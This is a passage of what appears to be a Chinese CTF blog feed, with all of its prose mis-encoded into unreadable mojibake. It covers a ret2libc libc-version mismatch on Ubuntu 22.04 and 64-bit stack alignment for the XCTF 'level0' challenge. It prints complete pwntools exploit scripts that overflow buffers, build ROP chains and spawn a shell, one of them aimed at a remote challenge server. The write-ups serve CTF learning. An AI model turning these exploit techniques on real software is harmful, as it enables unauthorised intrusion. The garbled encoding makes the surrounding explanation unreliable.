src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%989.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜9.png"></p><p>æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œå¯ä»¥æ­£å¸¸è·å¾— shell</p><p>å¤§è‡´å¯ä»¥çŒœæµ‹åº”è¯¥æ˜¯ Ubuntu 22.04 ä¸­ <code>system()</code> å‡½æ•°å’Œ <code>&quot;/bin/sh&quot;</code> åœ°å€ä¸å¯¹</p><hr><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨ Ubuntu 22.04 ä¸­éªŒè¯ä¸€ä¸‹</p><p>å…ˆå•æ­¥æ‰§è¡Œå®Œ <code>pop rdi</code> æŒ‡ä»¤ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9810.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜10.png"></p><p>æ­¤æ—¶æˆ‘ä»¬æŸ¥æ‰¾ <code>&quot;/bin/sh&quot;</code> å’Œ <code>system()</code> å‡½æ•°çš„åœ°å€ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9811.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜11.png"></p><p>ä½¿ç”¨ <code>set</code> å‘½ä»¤å¼ºè¡Œæ‰‹åŠ¨å°† RDI å¯„å­˜å™¨å’Œ RIP å¯„å­˜å™¨ä¿®æ”¹ï¼Œä½¿ RDI å­˜æ”¾ <code>&quot;/bin/sh&quot;</code> çš„åœ°å€ï¼ŒRIP å­˜æ”¾ <code>system()</code> å‡½æ•°çš„åœ°å€</p><p>ç„¶å si å•æ­¥æ­¥å…¥ï¼Œå‘ç°å·²ç»æ­£å¸¸è¿›å…¥ <code>system()</code> å‡½æ•°ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9812.png"></p><p>ç›´æ¥ finish ç»“æŸå‡½æ•°ï¼Œå¯ä»¥è·å¾— shellï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9813.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜13.png"></p><p>åœ¨ Pycharm ä¸­è¿è¡Œçš„ exp ä¹ŸåŒæ­¥è·å¾— shellï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9814.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜14.png"></p><blockquote><p>ç”±æ­¤å¯ä»¥å¾—å‡ºç»“è®ºï¼š<br>å…¶å® Ubuntu 22.04 ä¸­æ— æ³• getshell çš„åŸå› å°±æ˜¯ <code>system()</code> å‡½æ•°å’Œ <code>&quot;/bin/sh&quot;</code> çš„åœ°å€è®¡ç®—é”™è¯¯<br>è€Œ <code>system()</code> å‡½æ•°å’Œ <code>&quot;/bin/sh&quot;</code> çš„åœ°å€æ˜¯ç”± libc æ–‡ä»¶è®¡ç®—åç§»å¾—æ¥çš„ï¼Œå› æ­¤é—®é¢˜å‡ºåœ¨ libc æ–‡ä»¶ä¸Š</p></blockquote><hr><h2 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><p>ç”±äºé¢˜ç›®ç»™çš„ libc æ–‡ä»¶ä¸º <code>libc-2.23.so</code>ï¼Œåœ¨ Ubuntu 16.04 è¿™æ ·çš„è€ç‰ˆæœ¬ä¸­æ²¡æœ‰é—®é¢˜</p><p>ä½†æ˜¯åœ¨ Ubuntu 22.04 è¿™æ ·çš„æ–°ç‰ˆæœ¬ä¸­å°±ä¸å¯¹äº†</p><p>Ubuntu 16.04 çš„ glibc ç‰ˆæœ¬ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9815.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜15.png"></p><p>Ubuntu 22.04 çš„ glibc ç‰ˆæœ¬ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9816.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜16.png"></p><p><mark>è§£å†³åŠæ³•å°±æ˜¯åœ¨ Ubuntu 22.04 ä¸­ä½¿ç”¨ Ubuntu 22.04 è‡ªå¸¦çš„æ–°ç‰ˆ glibc æ¥è¿è¡Œç¨‹åº</mark></p><blockquote><p>æ³¨æ„ï¼š<br>æ›´æ”¹ç¨‹åºè¿è¡Œæ—¶ä½¿ç”¨çš„ libc ç‰ˆæœ¬éœ€è¦ä¸ ld æ–‡ä»¶çš„ç‰ˆæœ¬å¯¹åº”ï¼Œç”±äº Ubuntu 22.04 ä½¿ç”¨çš„ ld ç‰ˆæœ¬ä¸º 2.35ï¼Œæ‰€ä»¥å¦‚æœæŒ‡å®šé¢˜ç›®ç»™å‡ºçš„ <code>libc-2.23.so</code> æ–‡ä»¶ä¼šä½¿ç¨‹åºè¿è¡Œå´©æºƒï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9819.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜19.png"></p><p>è¿™é‡Œéœ€è¦æŒ‡å®š Ubuntu 22.04 è‡ªå¸¦çš„ libc æ–‡ä»¶</p></blockquote><p>Ubuntu 22.04 è‡ªå¸¦çš„ glibc ä¸€èˆ¬ä½äº <code>/usr/lib/x86_64-linux-gnu/libc.so.6</code>ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤æ¥æŸ¥æ‰¾ï¼š<code>sudo find / -name libc.so.6</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9817.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜17.png"></p><p>å°† exp æ”¹å†™å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># æŒ‡å®šä½¿ç”¨ Ubuntu 22.04 è‡ªå¸¦çš„ glibc æ¥è¿è¡Œç¨‹åº</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./Login'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span> <span class="token string">"/usr/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span><span class="token comment"># è®¡ç®—åç§»çš„ libc ä¹Ÿéœ€è¦ä¸ç¨‹åºç›¸ç»Ÿä¸€</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/usr/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Here is a tip: "</span><span class="token punctuation">)</span>stdin_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stdin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the username:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">365696460</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>libcbase <span class="token operator">=</span> stdin_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008c3</span>ret <span class="token operator">=</span> <span class="token number">0x400599</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the password:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶å³å¯æ­£å¸¸ getshellï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9818.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜18.png"></p><hr><h2 id="å†æ¬¡è°ƒè¯•åˆ†æ"><a href="#å†æ¬¡è°ƒè¯•åˆ†æ" class="headerlink" title="å†æ¬¡è°ƒè¯•åˆ†æ"></a>å†æ¬¡è°ƒè¯•åˆ†æ</h2><p>å†æ¬¡åœ¨ Ubuntu 22.04 ä¸‹è°ƒè¯•åˆ†æ</p><p>å•æ­¥æ‰§è¡Œï¼Œå‘ç°åœ°å€éƒ½å·²ç»æ­£å¸¸ï¼Œå¯ä»¥è°ƒç”¨ <code>system(&quot;/bin/sh&quot;)</code> æ¥ getshell äº†</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9821.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜21.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9820.png" alt="PWNä¸­ç¨‹åºçš„libcé—®é¢˜20.png"></p>]]></content>
    
    
    <summary type="html">å¯¹äºç¨‹åºä¸­æ²¡æœ‰ system å‡½æ•°ä¸ &quot;/bin/sh&quot; çš„æƒ…å†µï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦ä½¿ç”¨åˆ° libcï¼Œé€šè¿‡è®¡ç®— libc åç§»æ¥è·å– system å‡½æ•°ä¸ &quot;/bin/sh&quot; çš„åœ°å€ï¼Œä½†æ˜¯æœ‰æ—¶ä¼šå‘ç°åŒæ ·çš„ exp ä¸ºä»€ä¹ˆæ— æ³• getshellï¼Ÿå› ä¸º libc ç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œå¯¼è‡´è®¡ç®—å‡ºæ¥çš„åç§»æ˜¯é”™è¯¯çš„</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Pwntools" scheme="https://www.uf4te.cn/tags/Pwntools/"/>
    
  </entry>
  
  <entry>
    <title>PWNä¸­64ä½ç¨‹åºçš„å †æ ˆå¹³è¡¡</title>
    <link href="https://www.uf4te.cn/posts/58163c9b.html"/>
    <id>https://www.uf4te.cn/posts/58163c9b.html</id>
    <published>2023-11-17T16:00:00.000Z</published>
    <updated>2024-06-05T06:37:09.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å †æ ˆå¹³è¡¡"><a href="#å †æ ˆå¹³è¡¡" class="headerlink" title="å †æ ˆå¹³è¡¡"></a>å †æ ˆå¹³è¡¡</h1><blockquote><p>PWN å †æ ˆå¹³è¡¡æ˜¯æŒ‡åœ¨ PWN æ¼æ´åˆ©ç”¨ä¸­ï¼Œä¸ºäº†ä¿è¯ payload çš„å­—èŠ‚æ•°æ˜¯ 16 çš„å€æ•°ï¼Œéœ€è¦å¯¹å †æ ˆè¿›è¡Œå¹³è¡¡ï¼›<strong>è€Œåœ¨ 32 ä½ PWN æ¼æ´åˆ©ç”¨ä¸­ï¼Œæ²¡æœ‰å †æ ˆå¹³è¡¡ä¸€è¯´ï¼Œä»…åœ¨ 64 ä½ä¸­å­˜åœ¨</strong></p><p><code>glibc2.27</code> ä»¥åå¼•å…¥ XMM å¯„å­˜å™¨ï¼Œç”¨äºè®°å½•ç¨‹åºçŠ¶æ€ã€‚ä¸»è¦å‡ºç°åœ¨ Ubuntu 18.04 åŠä»¥åçš„ç‰ˆæœ¬ï¼Œéœ€è¦è€ƒè™‘å †æ ˆå¹³è¡¡ ï¼ˆæ ˆå¯¹é½ï¼‰</p><p>ä¸»è¦åŸå› åœ¨äº:<br>åœ¨è°ƒç”¨ <code>system()</code> å‡½æ•°æ—¶ï¼Œä¼šè¿›å…¥ <code>do_system</code> æ‰§è¡Œä¸€ä¸ª <code>movaps</code> æŒ‡ä»¤å¯¹ XMM å¯„å­˜å™¨è¿›è¡Œæ“ä½œï¼Œ<code>movaps</code> æŒ‡ä»¤è¦æ±‚ <code>RSP</code> æŒ‰ 16 å­—èŠ‚å¯¹é½ï¼Œå³ï¼š**<code>RSP</code> ä¸­åœ°å€çš„æœ€ä½ 4 ä½å¿…é¡»ä¸º 0ï¼Œç›´è§‚åœ°è¯´ï¼Œå°±æ˜¯è¯¥åœ°å€å¿…é¡»ä»¥æ•°å­—Â 0Â ç»“å°¾**</p><p><em>é—®ï¼šå¦‚ä½•è§£å†³å †æ ˆå¹³è¡¡é—®é¢˜ï¼Ÿ</em><br><mark>å¯ä»¥é€šè¿‡åœ¨è¿›å…¥ <code>system()</code> å‡½æ•°ä¹‹å‰å¢åŠ ä¸€ä¸ª <code>ret</code> æŒ‡ä»¤æ¥è§£å†³ï¼ˆå¸¸ç”¨ï¼‰ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥åœ¨ <code>system()</code> å‡½æ•°ä¸­ä¸æ‰§è¡Œç¬¬ä¸€æ¡ <code>push rbp</code> æ“ä½œæ¥è§£å†³</mark></p><p><em>é—®ï¼šä¸ºä»€ä¹ˆåŠ çš„æ˜¯ ret æŒ‡ä»¤ï¼Ÿ</em><br>ç”±äºåœ¨ <code>system()</code> å‡½æ•°ä¹‹å‰åŠ å…¥äº†ä¸€ä¸ªæ–°åœ°å€ï¼Œæ ˆé¡¶è¢«è¿«ä¸‹ç§» 8 ä¸ªå­—èŠ‚ï¼Œä½¿ä¹‹å¯¹é½Â 16 å­—èŠ‚ï¼Œæ»¡è¶³ <code>movaps</code> æŒ‡ä»¤å¯¹ XMM å¯„å­˜å™¨è¿›è¡Œæ“ä½œçš„æ¡ä»¶ï¼›åŒæ—¶ï¼Œç”±äºæ’å…¥çš„åœ°å€æŒ‡å‘äº†Â <code>ret</code>Â æŒ‡ä»¤ï¼Œç¨‹åºä»ç„¶å¯ä»¥é¡ºåˆ©åœ°è¿›å…¥Â <code>system(&quot;/bin/sh&quot;)</code>Â ä¸­ï¼Œ<strong>ä¸ä¼šæ”¹å˜ç¨‹åºæ‰§è¡Œæµç¨‹</strong></p></blockquote><ol><li>XMM å¯„å­˜å™¨æ˜¯ <strong>128 ä½</strong>çš„å¯„å­˜å™¨ï¼Œç§°ä¸ºï¼š<em>æµ®ç‚¹æ•°å¯„å­˜å™¨</em>ï¼ŒåŒ…æ‹¬ XMM0 - XMM15</li></ol><p>XMM å¯„å­˜å™¨ä¸»è¦ç”¨äºï¼š</p><ul><li>32 ä½å’Œ 64 ä½<em>æµ®ç‚¹æ•°</em>çš„æ“ä½œ</li><li>SIMD æŒ‡ä»¤ï¼šä¸€æ¡ SIMD æŒ‡ä»¤å¯ä»¥åŒæ—¶æ¥å—å¤šä¸ªæ•°æ®æµï¼Œæå‡å¤„ç†é€Ÿåº¦</li><li>SSE æŒ‡ä»¤ï¼šä¸€èˆ¬ç”¨ä¸åˆ°ï¼Œä¸è¯¦ç»†è®¨è®º</li></ul><p>é™¤äº† XMM å¯„å­˜å™¨å¤–ï¼Œè¿˜æœ‰ <strong>256 ä½</strong>çš„ YMM å¯„å­˜å™¨å’Œ <strong>512 ä½</strong>çš„ ZMM å¯„å­˜å™¨ï¼Œä¹Ÿæ˜¯ç±»ä¼¼çš„åŠŸèƒ½<br>éšç€ ZMM çš„å‡ºç°ï¼ŒXMM å’Œ YMM å¯„å­˜å™¨çš„ä¸ªæ•°è¢«æ‰©å±•åˆ°äº† 32 ä¸ª</p><ol start="2"><li><code>movups</code> å’Œ <code>movaps</code> æ˜¯ x86 æ±‡ç¼–è¯­è¨€ä¸­çš„ä¸¤æ¡æŒ‡ä»¤ï¼Œç”¨äºæ•°æ®ä¼ è¾“æ“ä½œï¼Œé€šå¸¸ç”¨äºå°†æ•°æ®ä»å†…å­˜åŠ è½½åˆ° XMM å¯„å­˜å™¨æˆ–ä» XMM å¯„å­˜å™¨å­˜å‚¨åˆ°å†…å­˜</li></ol><ul><li><code>movups</code></li></ul><p>æŠŠæºå­˜å‚¨å™¨å†…å®¹å€¼é€å…¥ç›®çš„å¯„å­˜å™¨ï¼Œä½†<strong>ä¸å¿…å¯¹é½å†…å­˜ 16 å­—èŠ‚</strong></p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">movups xmm<span class="token punctuation">,</span> xmm<span class="token operator">/</span>m128movups xmm<span class="token operator">/</span><span class="token number">128</span><span class="token punctuation">,</span> xmm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>movaps</code></li></ul><p>æŠŠæºå­˜å‚¨å™¨å†…å®¹å€¼é€å…¥ç›®çš„å¯„å­˜å™¨ï¼Œ<mark><strong>å½“æœ‰ m128 æ—¶ï¼Œå¿…é¡»å¯¹é½å†…å­˜ 16 å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯å†…å­˜åœ°å€ä½ 4 ä½ä¸ºå…¨ 0</strong></mark></p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">movaps xmm<span class="token punctuation">,</span> xmm<span class="token operator">/</span>m128movaps xmm<span class="token operator">/</span><span class="token number">128</span><span class="token punctuation">,</span> xmm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥å¾—çŸ¥ï¼š</li></ol><ul><li>ä½¿ç”¨Â XMMÂ å¯„å­˜å™¨æ—¶ï¼Œéœ€è¦Â 16 å­—èŠ‚å¯¹é½</li><li>ä½¿ç”¨Â YMM å¯„å­˜å™¨æ—¶ï¼Œéœ€è¦Â 32 å­—èŠ‚å¯¹é½</li><li>ä½¿ç”¨Â ZMMÂ å¯„å­˜å™¨æ—¶ï¼Œéœ€è¦Â 64Â å­—èŠ‚å¯¹é½</li></ul><hr><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><p>ä»¥æ”»é˜²ä¸–ç•Œçš„ä¸€é“ PWN é¢˜ä¸ºä¾‹ï¼š<a href="https://adworld.xctf.org.cn/media/file/task/291721f42a044f50a2aead748d539df0">ã€æ”»é˜²ä¸–ç•Œã€‘level0</a></p><p>ç¨‹åºä¿æŠ¤æœºåˆ¶ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%201.png" alt="æ”»é˜²ä¸–ç•Œ-level0 1.png"></p><p>ç¨‹åºé€»è¾‘ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%203.png" alt="æ”»é˜²ä¸–ç•Œ-level0 3.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%204.png" alt="æ”»é˜²ä¸–ç•Œ-level0 4.png"></p><p>å­˜åœ¨åé—¨å‡½æ•°ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%205.png" alt="æ”»é˜²ä¸–ç•Œ-level0 5.png"></p><p>å¾—åˆ° <code>callsystem</code> å‡½æ•°çš„åœ°å€ä¸ºï¼š<code>0x400596</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%207.png" alt="æ”»é˜²ä¸–ç•Œ-level0 7.png"></p><p>è„šæœ¬ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># æ‰“å°è°ƒè¯•ä¿¡æ¯</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># æœ¬åœ°Pwné€šä¹‹åï¼Œå°†contentæ”¹æˆ0ï¼ŒPwnè¿œç¨‹ç«¯å£</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/æ¡Œé¢/PWN/level0"</span><span class="token punctuation">)</span>  <span class="token comment"># ç¨‹åºåœ¨kaliçš„è·¯å¾„</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56877</span><span class="token punctuation">)</span>  <span class="token comment"># é¢˜ç›®çš„è¿œç¨‹ç«¯å£</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/æ¡Œé¢/PWN/level0"</span><span class="token punctuation">)</span>  <span class="token comment"># ç”Ÿæˆå¯¹è±¡elf</span>callsystem_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>  <span class="token comment"># è·å–callsystemå‡½æ•°çš„åœ°å€ï¼Œæœ¬é¢˜ä¸º:0x0400596ï¼Œåœ¨idaä¸­å¯ä»¥çœ‹åˆ°å‡½æ•°çš„åœ°å€</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>  <span class="token comment"># è¿™é‡Œä¸ç”¨callsystem_addrç›´æ¥ç”¨0x0400596ä¹Ÿæ˜¯å¯ä»¥çš„</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šé¢è¿™ä¸ªè„šæœ¬åœ¨è¿œç¨‹æ˜¯å¯ä»¥æ‰“é€šçš„ï¼Œå¦‚å›¾ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A11.png" alt="PWN-64ä½PWNç¨‹åºå †æ ˆå¹³è¡¡1.png"></p><p>ä½†æ˜¯åœ¨æœ¬åœ°ä¸å¯ä»¥ï¼Œæ‰“ä¸é€š<br>æ˜¾ç¤ºï¼š<code>[*] Got EOF while reading in interactive</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A12.png" alt="PWN-64ä½PWNç¨‹åºå †æ ˆå¹³è¡¡2.png"></p><blockquote><p>ç„å­¦çš„é—®é¢˜å‡ºç°äº†ï¼š</p><p>åŒæ ·çš„è„šæœ¬ï¼ŒåŒæ ·çš„ç¨‹åºï¼Œåœ¨è¿œç¨‹å¯ä»¥æ‰“é€šï¼Œåœ¨æœ¬åœ°å°±æ‰“ä¸é€š</p></blockquote><hr><h2 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h2><p>åœ¨ python è„šæœ¬å‘é€ payload ä¹‹å‰ï¼Œé€šè¿‡ gdb é™„åŠ è°ƒè¯•ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python è„šæœ¬è¢«æš‚åœï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A19.png" alt="PWN-64ä½PWNç¨‹åºå †æ 